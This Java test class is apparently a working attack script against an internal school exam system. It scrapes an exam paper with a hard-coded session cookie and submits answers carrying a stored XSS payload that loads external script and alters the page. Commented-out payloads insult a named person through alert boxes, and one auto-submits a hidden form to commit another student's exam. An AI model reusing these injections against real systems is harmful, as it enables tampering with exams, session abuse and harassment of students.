package com.bw.deity.test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.json.simple.*;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.junit.Test;

public class deityTest {

	//修改整个为取试卷的链接
	String geturl = "http://172.16.10.111/exam/exam/viewExamPaper.do?id=9a846207c3484fb49ac6c962d3ea8ea4&eid=b01e8c659d7e4af2bc2d55433eca54cf&detailId=39af196c43a644f5ac5c27c0d1638c69&classId=%E5%A4%A7%E6%95%B0%E6%8D%AE1701B&paperId=51c6db15ba3e4885871560ca238bb522";  // 填写url
	
	//修改toStudentId 即可
	String posturl = "http://172.16.10.111/exam/exam/saveBatch.do?commit=Y&toStudentId=9a846207c3484fb49ac6c962d3ea8ea4";
	
	//修改cookie
	String cookie = "a56f5a78-8421-4511-938e-eacb52ab65c1";   // 填写cookie
	
	
	@Test
	public void takeJson() throws Exception
	{
		Document document = Jsoup.connect(geturl).cookie("exam", cookie).get();
		
		
		
		//anaylysis to message
		Elements problems = document.select(".question");
		List<Map> lmp = new ArrayList<Map>();
		problems.forEach(e->{
			//进入all problem-Elements
			
			String problem = e.select(".titleContent").text().replaceAll("↵", "").replaceAll(" ", "").replaceAll("\\s*|\t|\r|\n", "");
			String t= e.select(".question-type").text();
			String type = t.equals("singlechoice")?"1":t.equals("multiplechoice")?"2":"0";
			String q = e.select(".question-id").text();
			
			HashMap<String, Object> singleAnswer = new HashMap<String,Object>();
			singleAnswer.put("q",q );
			singleAnswer.put("t", type.equals("2")?"c":"r");
			singleAnswer.put("a",null);
			lmp.add(singleAnswer);
			
			
		});
		
		/*for(int i=0;i<lmp.size();i++)
		{
			lmp.get(i).put("a", "<script>alert('冉晓阳是傻逼');</script>");
			if(i>10)
			{
				lmp.get(i).put("a", "<script>alert('傻逼冉晓阳是傻逼煞笔煞笔');</script>");
			}
		}*/
		/*lmp.get(0).put("a","<script>\n"
				+ "function post(URL) {\r\n" + 
				"  var temp = document.createElement(\"form\");\r\n" + 
				"  temp.action = URL;\r\n" + 
				"  temp.method = \"post\";\r\n" + 
				"  temp.style.display = \"none\";\r\n" + 
				
				"  document.body.appendChild(temp);\r\n" + 
				"  temp.submit();\r\n" + 
				"  return temp;\r\n" + 
				"}\r\n" + 
				""
				+ "post('/exam/exam/saveBatch.do?commit=Y&toStudentId=8a64d6f3ac9c469385825948f5a717d1');"
				+ "</script>");*/
		lmp.get(0).put("a", "</span><script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.js\"></script><script>$(\"div\").css(\"background-image\",\"url(https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1409224092,1124266154&fm=27&gp=0.jpg)\")</script><span>");
		System.out.println(lmp.size());
		
		System.out.println(JSONArray.toJSONString(lmp));
		Connection connect = Jsoup.connect(posturl);
		
		connect.requestBody(JSONArray.toJSONString(lmp));
		connect.header("Accept", "*/*");
		connect.header("Accept-Encoding", "gzip, deflate");
		connect.header("Accept-Language","zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
		connect.header("Content-Type", "application/json;charset=UTF-8");
		connect.cookie("exam", cookie);
		connect.ignoreContentType(true);
		Document post = connect.post();
		System.out.println(post.toString());
	}
	
	
}
